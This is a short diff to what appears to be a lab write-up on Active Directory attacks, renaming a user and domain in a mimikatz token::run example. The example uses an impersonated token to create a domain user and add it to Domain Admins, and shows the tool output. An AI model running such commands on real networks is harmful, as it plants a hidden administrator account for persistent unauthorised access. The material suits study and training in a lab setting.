@@ -75,7 +75,7 @@ Primary
 Add backdoor user:
 
 ```
-mimikatz # token::run /id:1075487 /process:"cmd.exe /c net user hacker Password.123 /add /domain && net group \"Domain Admins\" hacker /add /domain && net user hacker /domain"
+mimikatz # token::run /id:1075487 /process:"cmd.exe /c net user backdoor Password.123 /add /domain && net group \"Domain Admins\" backdoor /add /domain && net user backdoor /domain"
 Token Id  : 1075487
 User name :
 SID name  :
@@ -91,7 +91,7 @@ The command completed successfully.
 
 The request will be processed at a domain controller for domain winattacklab.local.
 
-User name                    hacker
+User name                    backdoor
 Full Name
 Comment
 User's comment
@@ -128,7 +128,7 @@ Token Id  : 1075487
 User name :
 SID name  :
 
-7156    {0;000f0ac5} 3 F 1075487        child\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
+7156    {0;000f0ac5} 3 F 1075487        winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
 ERROR kull_m_process_run_data ; CreateProcessAsUser (0x00000522)
 ```
 
